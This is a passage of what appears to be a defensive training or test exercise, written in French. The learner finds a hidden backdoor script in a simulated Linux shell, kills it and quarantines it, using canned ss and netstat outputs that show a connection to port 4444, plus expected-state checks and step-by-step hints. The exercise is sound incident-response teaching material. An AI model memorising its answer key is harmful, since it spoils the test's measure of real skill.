                            "mem": 0.8,
                            "command": "/usr/bin/restore_daemon --watch",
                        },
                    ],
                },
                "responses": [
                    {
                        "match": "ss -tulpn",
                        "output": (
                            "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port\n"
                            "tcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*\n"
                            "tcp   ESTAB  0      0      10.0.2.15:44102    203.0.113.66:4444\n"
                            "tcp   LISTEN 0      128    [::]:22          [::]:*\n"
                        ),
                    },
                    {
                        "match": "netstat -tulpn",
                        "output": (
                            "Active Internet connections (only servers)\n"
                            "Proto Recv-Q Send-Q Local Address  Foreign Address  State\n"
                            "tcp        0      0 0.0.0.0:22     0.0.0.0:*        LISTEN\n"
                            "tcp        0      0 10.0.2.15:44102 203.0.113.66:4444 ESTABLISHED\n"
                        ),
                    },
                ],
                "forbidden_commands": [],
            },
            "expected_state": {
                "files_checks": [
                    {"path": "/home/user/quarantine", "type": "dir"},
                    {"path": "/home/user/quarantine/backdoor.sh", "perms": "000"},
                    {
                        "path": "/home/user/rapport_incident.txt",
                        "content_contains": "backdoor",
                    },
                ],
                "files_not_exists": [
                    {"path": "/var/tmp/.hidden_service/backdoor.sh"},
                ],
                "process_not_running": "backdoor.sh",
                "commands_used": ["find", "kill"],
            },
            "hints": [
                "Un dossier caché ne s'affiche qu'avec `ls -la`. Le `find /var/tmp -name \"*.sh\"` le débusque aussi.",
                "Le processus porte le même nom que le script : `ps aux | grep backdoor`, puis `kill <PID>`.",
                "Pour finir : `mkdir quarantine`, `mv /var/tmp/.hidden_service/backdoor.sh quarantine/`, `chmod 000 quarantine/backdoor.sh`, puis rédige le rapport avec `echo ... > rapport_incident.txt` (mentionne backdoor et 203.0.113.66).",
            ],
            "difficulty": 6,
            "points": 300,
            "time_limit": 1200,
        },
    ],
}
